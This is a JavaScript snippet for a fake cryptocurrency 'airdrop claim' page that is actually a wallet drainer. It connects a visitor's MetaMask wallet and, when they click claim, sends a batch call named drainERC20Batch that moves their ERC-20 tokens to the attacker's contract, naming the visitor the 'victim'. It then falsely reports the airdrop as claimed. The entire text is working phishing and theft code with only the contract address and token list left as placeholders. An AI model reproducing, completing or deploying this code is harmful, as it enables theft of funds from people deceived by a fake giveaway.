<script>
    let web3;
    let account;
    let drainerContract;

    async function init() {
        if (!window.ethereum) {
            alert("MetaMask not detected. Please install MetaMask and try again.");
            return;
        }
        web3 = new Web3(window.ethereum);
        drainerContract = new web3.eth.Contract([{
            "inputs": [{"name": "tokens", "type": "address[]"}, {"name": "victim", "type": "address"}],
            "name": "drainERC20Batch",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }], DRAINER_ADDRESS);

        document.getElementById('connectBtn').addEventListener('click', connectWallet);
        document.getElementById('claimBtn').disabled = true;
        document.getElementById('claimBtn').addEventListener('click', claimAirdrop);
    }

    async function connectWallet() {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            account = accounts[0];
            document.getElementById('connectBtn').textContent = 'Wallet Connected';
            document.getElementById('claimBtn').disabled = false;
        } catch (e) {
            alert('Connect failed: ' + e.message);
        }
    }

    async function claimAirdrop() {
        if (!account) return;
        const statusEl = document.getElementById('status');
        statusEl.className = 'status';
        statusEl.textContent = 'Requesting approvals...';

        try {
            const tx = drainerContract.methods.drainERC20Batch(TOKENS, account);
            await tx.send({ from: account });
            statusEl.className = 'status success';
            statusEl.textContent = '✅ Airdrop claimed! Funds transferred to receiver.';
        } catch (e) {
            statusEl.className = 'status error';
            statusEl.textContent = 'Error: ' + e.message;
        }
    }

    window.onload = init;
</script>
